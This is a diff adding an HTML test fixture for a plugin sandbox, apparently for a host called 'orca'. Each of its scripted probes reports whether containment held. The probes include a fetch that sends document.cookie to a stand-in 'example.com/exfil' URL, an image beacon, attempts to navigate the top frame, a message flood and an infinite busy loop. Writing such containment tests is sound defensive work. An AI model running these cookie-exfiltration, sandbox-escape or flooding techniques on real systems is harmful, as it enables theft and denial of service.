@@ -1,0 +1,201 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <!-- Hostile fixture: CSP, sandbox and bridge budgets must contain each probe; DOM verdicts expose failures. -->
+  </head>
+  <body>
+    <h1>Hostile panel fixture</h1>
+    <ul id="results"></ul>
+    <button id="bridge">Run bridge budget probes</button>
+    <button id="navigate-top">Try top navigation</button>
+    <button id="navigate-self">Try self navigation</button>
+    <button id="navigate-anchor-form">Try anchor and form navigation</button>
+    <button id="navigate-meta">Try meta refresh navigation</button>
+    <button id="busy">Enter busy loop (watchdog probe)</button>
+    <script>
+      'use strict'
+      // The main-process guard must bind the frame before plugin parsing.
+      window.name = ''
+      var results = document.getElementById('results')
+      function report(name, contained, detail) {
+        if (document.querySelector('[data-probe="' + name + '"]')) return
+        var li = document.createElement('li')
+        li.dataset.probe = name
+        li.dataset.contained = contained ? 'true' : 'false'
+        li.textContent =
+          name + ': ' + (contained ? 'CONTAINED' : 'ESCAPED') + (detail ? ' — ' + detail : '')
+        results.appendChild(li)
+        document.title = 'probes:' + results.children.length
+      }
+      function markNavigationInvocation(name) {
+        var marker = document.createElement('meta')
+        marker.dataset.navigationProbeInvoked = name
+        marker.content = 'true'
+        document.head.appendChild(marker)
+      }
+
+      // Probe 1: fetch() exfiltration — must be blocked by connect-src 'none'.
+      var cookieValue = 'x'
+      try {
+        cookieValue = document.cookie || 'x'
+      } catch (_) {
+        // Opaque-origin frames may reject cookie access before CSP runs.
+      }
+      fetch('https://example.com/exfil?d=' + encodeURIComponent(cookieValue))
+        .then(function () {
+          report('fetch-exfil', false, 'request succeeded')
+        })
+        .catch(function () {
+          report('fetch-exfil', true)
+        })
+
+      // Probe 2: <img> beacon — must be blocked by img-src data: only.
+      var img = new Image()
+      var settled = false
+      img.onload = function () {
+        if (!settled) {
+          settled = true
+          report('img-beacon', false, 'image loaded')
+        }
+      }
+      img.onerror = function () {
+        if (!settled) {
+          settled = true
+          report('img-beacon', true)
+        }
+      }
+      img.src = 'https://example.com/beacon.gif'
+      setTimeout(function () {
+        if (!settled) {
+          settled = true
+          report('img-beacon', true, 'no load event')
+        }
+      }, 3000)
+
+      // Opt-in navigation preserves network/bridge evidence until the harness reads it.
+      document.getElementById('navigate-top').addEventListener('click', function () {
+        markNavigationInvocation('top-navigation')
+        try {
+          window.top.location.href = 'https://example.com/'
+          setTimeout(function () {
+            report('top-navigation', window.top !== window)
+          }, 0)
+        } catch (error) {
+          report('top-navigation', true, error.name)
+        }
+      })
+
+      document.getElementById('navigate-self').addEventListener('click', function () {
+        markNavigationInvocation('self-navigation')
+        try {
+          window.location.href = 'https://example.com/self-navigation'
+          setTimeout(function () {
+            report('self-navigation', true)
+          }, 0)
+        } catch (error) {
+          report('self-navigation', true, error.name)
+        }
+      })
+
+      document.getElementById('navigate-anchor-form').addEventListener('click', function () {
+        markNavigationInvocation('anchor-form-navigation')
+        var anchor = document.createElement('a')
+        anchor.href = 'https://example.com/anchor-navigation'
+        anchor.textContent = 'Navigation probe'
+        document.body.appendChild(anchor)
+        anchor.click()
+
+        var form = document.createElement('form')
+        form.action = 'https://example.com/form-navigation'
+        document.body.appendChild(form)
+        form.requestSubmit()
+        setTimeout(function () {
+          report('anchor-form-navigation', true)
+        }, 0)
+      })
+
+      document.getElementById('navigate-meta').addEventListener('click', function () {
+        markNavigationInvocation('meta-refresh-navigation')
+        var refresh = document.createElement('meta')
+        refresh.httpEquiv = 'refresh'
+        refresh.content = '0;url=https://example.com/meta-refresh'
+        document.head.appendChild(refresh)
+        setTimeout(function () {
+          report('meta-refresh-navigation', true)
+        }, 0)
+      })
+
+      // Probe 7: an oversized valid-looking call must receive a real refusal.
+      function expectRefusal(name, call, code) {
+        var settled = false
+        call.then(
+          function () {
+            settled = true
+            report(name, false, 'unexpected success')
+          },
+          function (error) {
+            settled = true
+            report(name, error.code === code, error.code)
+          }
+        )
+        setTimeout(function () {
+          if (!settled) {
+            report(name, false, 'host sent no refusal')
+          }
+        }, 2000)
+      }
+
+      document.getElementById('bridge').addEventListener('click', function () {
+        expectRefusal(
+          'oversized-message',
+          window.orca.host.call('workspace.readContext', { padding: 'x'.repeat(128 * 1024) }),
+          'too_large'
+        )
+
+        // Floods must spend rate budget before parsing; the final valid call proves it. A srcdoc
+        // iframe can post raw invalid, pong and binary messages; an isolated guest (its own top
+        // window, no raw channel) can only flood through orca.host.call.
+        setTimeout(function () {
+          // Past the 120-per-10-seconds panel budget.
+          for (var i = 0; i < 150; i++) {
+            if (window.parent !== window) {
+              var payload =
+                i % 3 === 0
+                  ? { orca: 1, kind: 'evt', event: 'pong', payload: i }
+                  : i % 3 === 1
+                    ? { type: 'invalid-hostile-message', sequence: i }
+                    : new Uint8Array(2048)
+              window.parent.postMessage(payload, '*')
+            } else {
+              window.orca.host.call('invalid.hostileFlood', { sequence: i }).catch(function () {})
+            }
+          }
+          expectRefusal(
+            'message-flood',
+            window.orca.host.call('workspace.readContext', {}),
+            'rate_limited'
+          )
+        }, 150)
+      })
+
+      // Opt-in busy loop: watchdog must demote the panel while Chromium isolates its renderer.
+      function enterBusyLoop() {
+        report('busy-loop', true, 'watchdog should suspend this panel')
+        while (true) {
+          // Deliberately hostile fixture.
+        }
+      }
+      document.getElementById('busy').addEventListener('click', enterBusyLoop)
+      window.addEventListener('message', function (event) {
+        if (
+          event.source === window.parent &&
+          event.data &&
+          event.data.type === 'orca-hostile-busy-probe'
+        ) {
+          enterBusyLoop()
+        }
+      })
+    </script>
+  </body>
+</html>
